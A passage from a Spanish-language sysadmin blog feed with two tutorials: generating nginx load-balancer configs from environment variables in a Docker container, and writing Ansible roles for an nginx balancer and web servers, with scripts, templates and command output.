&lt;p&gt;La solución es tan simple como efectiva: generar las configuraciones estáticas de forma dinámica. La idea es pasar las variables de entorno al contenedor, y que antes de ejecutar su servicio, genere la configuración a partir de las variables recibidas. Un ejercicio de &lt;em&gt;templating&lt;/em&gt; básico.&lt;/p&gt;
&lt;h2&gt;Un ejemplo: un balanceador con nginx con backends variables.&lt;/h2&gt;
&lt;p&gt;El esquema de un balanceador en &lt;strong&gt;nginx&lt;/strong&gt; sigue siempre el mismo patrón:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;upstream&lt;/span&gt; &lt;span class="s"&gt;backend&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kn"&gt;...&lt;/span&gt;
&lt;span class="err"&gt;}&lt;/span&gt;

&lt;span class="s"&gt;server&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kn"&gt;listen&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kn"&gt;server_name&lt;/span&gt; &lt;span class="s"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kn"&gt;location&lt;/span&gt; &lt;span class="s"&gt;/&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kn"&gt;proxy_pass&lt;/span&gt; &lt;span class="s"&gt;http://backend&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El truco consiste en que el contenedor va a ejecutar un &lt;em&gt;script&lt;/em&gt; que va a generar la configuración y va a lanzar nuestro binario. Para hacerlo limpiamente, vamos a separar la ejecución, del &lt;em&gt;script&lt;/em&gt; de generación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ cat entrypoint.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

./config.sh &amp;gt; /etc/nginx/conf.d/balancer
&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/nginx -g &lt;span class="s2"&gt;&amp;quot;daemon off;&amp;quot;&lt;/span&gt;
gerard@sirius:~/docker/dynamic_configs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y el &lt;em&gt;script&lt;/em&gt; de generación solo tiene la responsabilidad de leer las variables de entorno y sacar la configuración por pantalla. Por simplicidad, estoy usando un &lt;em&gt;script&lt;/em&gt; en &lt;strong&gt;bash&lt;/strong&gt;, pero se podría hacer con otro lenguaje e incluso con un motor de plantillas. Me gusta especialmente la combinación &lt;strong&gt;python&lt;/strong&gt; + &lt;strong&gt;jinja2&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ cat config.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;upstream backend {&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; BACKEND in &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKENDS&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/,/ /g&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  server &lt;/span&gt;&lt;span class="nv"&gt;$BACKEND&lt;/span&gt;&lt;span class="s2"&gt;;&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;\&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;

&lt;span class="s2"&gt;server {&lt;/span&gt;
&lt;span class="s2"&gt;    listen 80;&lt;/span&gt;
&lt;span class="s2"&gt;    server_name _;&lt;/span&gt;

&lt;span class="s2"&gt;    location / {&lt;/span&gt;
&lt;span class="s2"&gt;        proxy_pass http://backend;&lt;/span&gt;
&lt;span class="s2"&gt;    }&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
gerard@sirius:~/docker/dynamic_configs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar que la configuración generada depende de la variable de entorno &lt;em&gt;BACKENDS&lt;/em&gt;, por ejemplo, con dos nodos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ &lt;span class="nv"&gt;BACKENDS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;server1:8080,server2:8080 ./config.sh 
upstream backend &lt;span class="o"&gt;{&lt;/span&gt;
    server server1:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server server2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;

    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://backend&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

gerard@sirius:~/docker/dynamic_configs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El &lt;em&gt;script&lt;/em&gt; &lt;em&gt;entrypoint.sh&lt;/em&gt; llamará este otro &lt;em&gt;script&lt;/em&gt; y va a salvar esta configuración en algún sitio que &lt;strong&gt;nginx&lt;/strong&gt; pueda cargar, por ejemplo, en una carpeta incluida en la configuración principal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ cat nginx.conf 
worker_processes  &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections  &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/docker/dynamic_configs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente, solo nos queda poner todas las piezas en su sitio, mediante el &lt;em&gt;Dockerfile&lt;/em&gt; correspondiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ cat Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /run/nginx
COPY nginx.conf /etc/nginx/
COPY config.sh entrypoint.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/entrypoint.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/dynamic_configs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente podemos crear un balanceador indicando simplemente los parámetros en el &lt;em&gt;docker run&lt;/em&gt;, previo &lt;em&gt;docker build&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/dynamic_configs$ docker run -ti --rm -e &lt;span class="s2"&gt;&amp;quot;BACKENDS=server1:8080,server2:8080,server3:8080&amp;quot;&lt;/span&gt; balancer
...  
&lt;/pre&gt;&lt;/div&gt;</content><category term="docker"></category><category term="12factor"></category><category term="configuración"></category><category term="templating"></category></entry><entry><title>Creando roles con ansible</title><link href="https://www.linuxsysadmin.ml/2016/08/creando-roles-con-ansible.html" rel="alternate"></link><published>2016-08-29T08:00:00+02:00</published><updated>2016-08-29T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-08-29:/2016/08/creando-roles-con-ansible.html</id><summary type="html">&lt;p&gt;Ya vimos que es muy fácil crear varias máquinas iguales con &lt;strong&gt;ansible&lt;/strong&gt;. A veces nos puede interesar disponer de recetas y decidir en un &lt;em&gt;playbook&lt;/em&gt; general cuales de ellas ponemos en cada servidor. Una receta podría añadir un servidor de aplicaciones mientras que otra podría habilitarnos una bases de datos …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos que es muy fácil crear varias máquinas iguales con &lt;strong&gt;ansible&lt;/strong&gt;. A veces nos puede interesar disponer de recetas y decidir en un &lt;em&gt;playbook&lt;/em&gt; general cuales de ellas ponemos en cada servidor. Una receta podría añadir un servidor de aplicaciones mientras que otra podría habilitarnos una bases de datos.&lt;/p&gt;
&lt;p&gt;Esto nos permite combinar las recetas para desplegar toda la funcionalidad de nuestro servicio, distribuyéndolas entre nuestros servidores de acuerdo a las necesidades. Como ejemplo, podríamos poner el servidor de &lt;em&gt;PHP&lt;/em&gt; y el de &lt;em&gt;MySQL&lt;/em&gt; en recetas distintas; pondríamos las 2 en el mismo servidor para un entorno de test, y podríamos separar los servicios entre servidores (incluso replicando) en entornos mas profesionales.&lt;/p&gt;
&lt;p&gt;Para esta demostración, vamos a crear &lt;em&gt;roles&lt;/em&gt; para un entorno de un balanceador y dos servidores web normales. En ambos casos, el servicio estándar va a ser &lt;strong&gt;nginx&lt;/strong&gt;, lo que nos abre a la posibilidad de reusar partes comunes, usando dependencias entre ellos.&lt;/p&gt;
&lt;p&gt;También podemos encontrar roles prefabricados y listos para usarse en &lt;a href="https://galaxy.ansible.com/"&gt;Ansible Galaxy&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;El entorno&lt;/h2&gt;
&lt;p&gt;Disponemos de 3 máquinas en el entorno, y de otra máquina desde la que lanzaremos los &lt;em&gt;playbooks&lt;/em&gt;. Hemos utilizado los contenedores &lt;strong&gt;Docker&lt;/strong&gt; de &lt;a href="https://www.linuxsysadmin.ml/2016/06/controlando-contenedores-docker-con-ansible.html"&gt;otro artículo&lt;/a&gt; por comodidad.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat inventory/hosts &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;balancer&lt;span class="o"&gt;]&lt;/span&gt;
slave1

&lt;span class="o"&gt;[&lt;/span&gt;web&lt;span class="o"&gt;]&lt;/span&gt;
slave2
slave3
~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping balancer&lt;/span&gt;
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping web&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave3 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Como crear un rol&lt;/h2&gt;
&lt;p&gt;Lo primero para entender que es un rol y como funcionan es mirar en &lt;a href="http://docs.ansible.com/ansible/playbooks_roles.html#roles"&gt;la documentación&lt;/a&gt;. Es especialmente interesante saber que tiene cada carpeta y para que sirve; solo voy a explicar las que usemos.&lt;/p&gt;
&lt;p&gt;Lanzamos el comando &lt;strong&gt;ansible-galaxy&lt;/strong&gt; para crear un rol vacío:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible-galaxy init --offline roles/test&lt;/span&gt;
- roles/test was created successfully
~ &lt;span class="c1"&gt;# tree roles/test/&lt;/span&gt;
roles/test/
├── README.md
├── defaults
│   └── main.yml
├── files
├── handlers
│   └── main.yml
├── meta
│   └── main.yml
├── tasks
│   └── main.yml
├── templates
├── tests
│   ├── inventory
│   └── test.yml
└── vars
    └── main.yml

&lt;span class="m"&gt;8&lt;/span&gt; directories, &lt;span class="m"&gt;8&lt;/span&gt; files
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Las carpetas mas interesantes son la de &lt;em&gt;tasks&lt;/em&gt; la de &lt;em&gt;meta&lt;/em&gt;, la de &lt;em&gt;files&lt;/em&gt; y la de &lt;em&gt;templates&lt;/em&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;tasks&lt;/strong&gt; &amp;rarr; es donde se ponen los pasos a ejecutar en el &lt;em&gt;playbook&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;meta&lt;/strong&gt; &amp;rarr; es donde se especifican las dependencias con otros roles.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;files&lt;/strong&gt; y &lt;strong&gt;templates&lt;/strong&gt; &amp;rarr; aquí se ponen los ficheros que se utilizan en los módulos de ficheros y de plantillas, respectivamente.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A partir de aquí se trata de eliminar las que no usemos y rellenar las que sí vayamos a usar.&lt;/p&gt;
&lt;h2&gt;Diseño de roles&lt;/h2&gt;
&lt;p&gt;Queremos preparar 2 tipos distintos de máquinas: el balanceador y los servidores web. En ambos casos se trata de instalar &lt;strong&gt;nginx&lt;/strong&gt;, poner una configuración para la tarea que desempeñen, y en caso de los servidores web, poner el contenido estático.&lt;/p&gt;
&lt;p&gt;Vamos a crear un &lt;em&gt;role&lt;/em&gt; para el balanceador, y otro para los servidores web. Siguiendo la filosofía &lt;a href="https://es.wikipedia.org/wiki/No_te_repitas"&gt;DRY (Don't repeat yourself)&lt;/a&gt;, vamos a delegar la instalación de &lt;strong&gt;nginx&lt;/strong&gt; a un tercer &lt;em&gt;role&lt;/em&gt;, que a su vez será una dependencia para los otros dos.&lt;/p&gt;
&lt;p&gt;Eso nos da 3 roles, con una estructura de ficheros simple; un rol para el &lt;strong&gt;nginx&lt;/strong&gt; que solo ejecuta tareas, otro para el balanceador (con la dependencia y los ficheros auxiliares) y otro rol para el servidor web (con la dependencia y sus ficheros).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# tree roles/&lt;/span&gt;
roles/
├── balancer
│   ├── meta
│   │   └── main.yml
│   ├── tasks
│   │   └── main.yml
│   └── templates
│       └── balancer.j2
├── nginx
│   └── tasks
│       └── main.yml
└── web
    ├── meta
    │   └── main.yml
    ├── tasks
    │   └── main.yml
    └── templates
        ├── index.j2
        └── web.j2

&lt;span class="m"&gt;10&lt;/span&gt; directories, &lt;span class="m"&gt;8&lt;/span&gt; files
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;El rol de nginx&lt;/h3&gt;
&lt;p&gt;El único propósito de este rol es instalar &lt;strong&gt;nginx&lt;/strong&gt;, retirar el &lt;em&gt;site&lt;/em&gt; que viene por defecto, y asegurar que esté corriendo el servicio (en contenedores &lt;strong&gt;docker&lt;/strong&gt; no se levantan tras instalarse). La idea es que el resto de roles van a poner una configuración y a recargar el &lt;strong&gt;nginx&lt;/strong&gt; para aplicarla; así que de momento, nos vale.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/nginx/tasks/main.yml &lt;/span&gt;
---
- name: Install nginx
  apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx-light &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;installed
- name: Ensure example virtualhost is not there
  file: &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/default &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;absent
- name: Ensure nginx is running
  service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;started
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resto de carpetas son innecesarias, así que las borramos.&lt;/p&gt;
&lt;h3&gt;El rol web&lt;/h3&gt;
&lt;p&gt;Este rol espera tener &lt;strong&gt;nginx&lt;/strong&gt; instalado y se limita a poner la configuración del mismo, así como el contenido web.&lt;/p&gt;
&lt;p&gt;El primer paso es declarar que tenemos una dependencia con el rol &lt;em&gt;nginx&lt;/em&gt;. Esto se hace en la carpeta &lt;em&gt;meta&lt;/em&gt;, y nos asegura que se habrá ejecutado antes el rol &lt;em&gt;nginx&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/web/meta/main.yml &lt;/span&gt;
dependencies:
  - nginx
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podemos especificar los pasos para tener nuestro rol completo, partiendo de un rol &lt;em&gt;nginx&lt;/em&gt; aplicado. Básicamente se trata de poner la directiva &lt;em&gt;server&lt;/em&gt; que nos interese, el contenido web en &lt;em&gt;/var/www/html&lt;/em&gt; y hacer un &lt;em&gt;reload&lt;/em&gt; del &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Como punto interesante, se han usado plantillas para crear los ficheros destino. Esto nos permite crear las configuraciones basándonos en variables, que vendrán del &lt;em&gt;playbook&lt;/em&gt; general. En el caso concreto de la configuración del &lt;strong&gt;nginx&lt;/strong&gt; no era necesario usar plantillas porque no usa variables; se podría haber puesto el fichero en la carpeta &lt;em&gt;files&lt;/em&gt; y usar el módulo &lt;em&gt;copy&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/web/tasks/main.yml &lt;/span&gt;
---
- name: Put content virtualhost
  template: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;web.j2 &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/web
- name: Put HTML files
  template: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;index.j2 &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/var/www/html/index.html
- name: Reload nginx configuration
  service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;reloaded
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente, necesitamos poner las plantillas en &lt;em&gt;templates&lt;/em&gt;, siguiendo la sintaxis adecuada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/web/templates/web.j2 &lt;/span&gt;
server &lt;span class="o"&gt;{&lt;/span&gt;
    root /var/www/html&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# cat roles/web/templates/index.j2 &lt;/span&gt;
Hello from &lt;span class="o"&gt;{{&lt;/span&gt; name &lt;span class="o"&gt;}}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Eliminamos todas las carpetas que no nos sirven, y hemos acabado.&lt;/p&gt;
&lt;h3&gt;El rol balancer&lt;/h3&gt;
&lt;p&gt;Partiendo de que tenemos &lt;strong&gt;nginx&lt;/strong&gt; instalado, solo hay que poner una configuración concreta para que se haga balanceo, tras lo que haremos un &lt;em&gt;reload&lt;/em&gt; del &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Como en el caso anterior, tenemos que declarar la dependencia con el rol &lt;em&gt;nginx&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/balancer/meta/main.yml &lt;/span&gt;
dependencies:
  - nginx
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Los pasos, de forma análoga al caso anterior, se ponen en la carpeta &lt;em&gt;tasks&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/balancer/tasks/main.yml &lt;/span&gt;
---
- name: Put balancer virtualhost
  template: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;balancer.j2 &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/balancer
- name: Reload nginx configuration
  service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;reloaded
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente ponemos la plantilla para la configuración en &lt;em&gt;templates&lt;/em&gt;. Nuevamente esperamos la variable &lt;em&gt;backends&lt;/em&gt; desde el &lt;em&gt;playbook&lt;/em&gt; principal, que es una lista de servidores de &lt;em&gt;backend&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat roles/balancer/templates/balancer.j2 &lt;/span&gt;
upstream backends &lt;span class="o"&gt;{&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;% &lt;span class="k"&gt;for&lt;/span&gt; backend in backends %&lt;span class="o"&gt;}&lt;/span&gt;
    server &lt;span class="o"&gt;{{&lt;/span&gt; backend &lt;span class="o"&gt;}}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;% endfor %&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://backends&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y limpiamos el resto de carpetas.&lt;/p&gt;
&lt;h2&gt;Usando los roles&lt;/h2&gt;
&lt;p&gt;Disponemos de tres máquinas, accesibles desde la red, con los nombres &lt;em&gt;slave1&lt;/em&gt;, &lt;em&gt;slave2&lt;/em&gt; y &lt;em&gt;slave3&lt;/em&gt;. Como hemos visto en el fichero de inventario, el &lt;em&gt;slave1&lt;/em&gt; va a ejercer de balanceador, mientras que los otros dos harán de servidores web.&lt;/p&gt;
&lt;p&gt;Para ello solo hay que asignarles el rol que les toca, con las variables que estos roles necesitan. Teniendo los roles preparados, es tan fácil como indicar que servidor hace cada rol, indicando las variables que nos interesan en este entorno concreto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat myenv.yml &lt;/span&gt;
- name: Install balancer
  hosts: balancer
  roles:
    - role: balancer
      backends:
        - slave2:80
        - slave3:80
- name: Install webservers
  hosts: web
  roles:
    - role: web
      name: &lt;span class="s2"&gt;&amp;quot;web_{{ ansible_hostname }}&amp;quot;&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lanzamos el &lt;em&gt;playbook&lt;/em&gt;, para que nos monte nuestro entorno:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible-playbook -i inventory/ myenv.yml &lt;/span&gt;

PLAY &lt;span class="o"&gt;[&lt;/span&gt;Install balancer&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;setup&lt;span class="o"&gt;]&lt;/span&gt; *******************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Install nginx&lt;span class="o"&gt;]&lt;/span&gt; ***************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Ensure example virtualhost is not there&lt;span class="o"&gt;]&lt;/span&gt; *************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;nginx : Ensure nginx is running&lt;span class="o"&gt;]&lt;/span&gt; *****************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;balancer : Put balancer virtualhost&lt;span class="o"&gt;]&lt;/span&gt; *************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;balancer : Reload nginx configuration&lt;span class="o"&gt;]&lt;/span&gt; ***********************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;slave1&lt;span class="o"&gt;]&lt;/span&gt;

PLAY &lt;span class="o"&gt;[&lt;/span&gt;Install webservers&lt;span class="o"&gt;]&lt;/span&gt; ******************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;setup&lt;span class="o"&gt;]&lt;/span&gt; *******************************************************************
